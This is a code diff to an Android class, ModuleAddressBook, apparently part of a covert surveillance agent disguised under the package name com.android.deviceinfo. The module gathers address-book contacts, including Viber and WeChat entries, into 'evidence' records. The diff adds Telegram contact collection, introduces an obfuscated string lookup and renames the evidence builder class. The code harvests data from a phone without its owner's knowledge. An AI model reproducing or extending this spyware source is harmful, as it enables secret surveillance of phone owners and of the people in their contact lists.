@@ -17,7 +17,7 @@ import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
 import com.android.deviceinfo.crypto.Digest;
 import com.android.deviceinfo.db.RecordVisitor;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.evidence.Markup;
 import com.android.deviceinfo.interfaces.Observer;
@@ -31,6 +31,7 @@ import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
 import com.android.deviceinfo.util.WChar;
+import com.android.m.M;
 
 public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 
@@ -43,11 +44,16 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 	public static final int PHONE = 0x08;
 	public static final int VIBER = 0x0b;
 	public static final int WECHAT = 0x0c;
+	public static final int TELEGRAM = 0x0e;
 	public static final int LOCAL = 0x80000000;
+
+
 
 	private PickContact contact;
 	Markup markupContacts;
 	static HashMap<Long, Long> contacts; // (contact.id, contact.pack.crc)
+	
+	String observe = M.e("com.android.contacts");
 
 	private String myPhone;
 
@@ -210,7 +216,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 
 		boolean needToSerialize = false;
 
-		final EvidenceReference log = new EvidenceReference(EvidenceType.ADDRESSBOOK);
+		final EvidenceBuilder log = new EvidenceBuilder(EvidenceType.ADDRESSBOOK);
 
 		// for every Contact
 		while (iter.hasNext()) {
@@ -394,7 +400,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 		final DataBuffer db_header = new DataBuffer(payload, 0, 4);
 		db_header.writeInt(size);
 
-		EvidenceReference.atomic(EvidenceType.ADDRESSBOOK, null, payload);
+		EvidenceBuilder.atomic(EvidenceType.ADDRESSBOOK, null, payload);
 	}
 
 	public static boolean createEvidenceRemote(int type, com.android.deviceinfo.module.chat.Contact c) {
@@ -410,7 +416,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (createEvidenceRemote) new address");
 			}
-			EvidenceReference.atomic(EvidenceType.ADDRESSBOOK, null, packet);
+			EvidenceBuilder.atomic(EvidenceType.ADDRESSBOOK, null, packet);
 		}
 		return needToSerialize;
 	}
